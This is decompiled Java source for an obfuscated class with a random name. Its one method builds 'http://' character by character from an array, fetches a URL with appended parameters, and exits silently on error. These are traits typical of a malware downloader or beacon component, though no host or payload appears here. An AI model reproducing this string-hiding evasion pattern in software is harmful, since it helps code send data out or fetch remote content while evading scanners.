import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

// 
// Decompiled by Procyon v0.5.30
// 

public class GiknbqgwShSBPEslNCDt
{
    public static String bz(final String s, final String s2) {
        String string = null;
        final String[] array = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", ":", "/", ".", "=", "&", "-" };
        if (s.startsWith(new StringBuffer().append(array[7]).append(array[19]).append(array[19]).append(array[15]).append(array[26]).append(array[27]).append(array[27]).toString())) {
            try {
                String string2 = s;
                if (s2 != null && s2.length() > 0) {
                    string2 = string2 + "?" + s2;
                }
                final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(string2).openConnection().getInputStream()));
                final StringBuffer sb = new StringBuffer();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    sb.append(line);
                }
                bufferedReader.close();
                string = sb.toString();
            }
            catch (Exception ex) {
                System.exit(0);
            }
        }
        return string;
    }
}
